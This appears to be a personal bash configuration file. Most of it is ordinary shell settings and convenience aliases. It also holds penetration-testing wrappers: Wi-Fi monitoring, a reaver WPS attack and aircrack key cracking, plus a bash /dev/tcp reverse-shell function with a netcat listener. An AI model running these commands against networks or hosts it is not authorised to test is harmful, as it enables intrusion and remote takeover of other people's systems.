# ~/.bashrc

# private
source ~/.bash_private

# settings
stty stop ''; stty start '';
setxkbmap -option ctrl:nocaps
shopt -s autocd # Allows cd without cd.
shopt -s checkwinsize # Check window size.
HISTSIZE= HISTFILESIZE= # Infinite history.

# alias
alias ls="ls --color=auto"
alias grep="grep --color=auto"
alias decrypt="sudo udisksctl unlock --block-device /dev/disk/by-uuid/2c50ea3e-0cd5-497c-a5a9-2e97973faa00"
alias lock="xset dpms force off; i3lock-fancy"
alias wm-class="xprop | grep WM_CLASS"
alias wm-size="xprop | grep REGION"

# packages
alias remove-residual="dpkg -l | grep '^rc' | awk '{print $2}' | sudo xargs dpkg --purge"

# bootable
function create-bootable() { sudo ddrescue $1 $2 --force -D; }

# logs
function log-search() { sudo grep -rsh $1 /var/log | sort; }

# connections
alias ssh-connections="sudo netstat -tnpa | grep 'ESTABLISHED.*sshd'"
alias smb-connections="sudo smbstatus -S && sudo smbstatus -L"

# airmon
alias air-start="sudo airmon-ng start wlp5s0"
alias air-stop="sudo airmon-ng stop wlp5s0mon"
alias air-listen="sudo airodump-ng wlp5s0mon"
function air-wps-new() { sudo reaver -i wlp5s0mon -vv -S -b "$1" -c "$2" -w -N "$3"; }
function air-wps-restore() { sudo reaver -i wlp5s0mon -vv -S -b "$1" -c "$2" -w -s "$3"; } 
function air-record() { sudo airodump-ng -c "$1" -w ~/archive/pen/capture/data-cap wlp5s0mon; }
function air-decrypt() { sudo aircrack-ng -z "$1" -w "$2"; }

# shell
function shell-connect() { bash -i >& /dev/tcp/"$1"/"$2" 0>&1; }
function shell-listen() { sudo nc -nvlp "$1"; }

# huawei
alias usb-switch-huawei="sudo usb_modeswitch -J -v 12d1 -p 14fe"

# color
PS1='\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
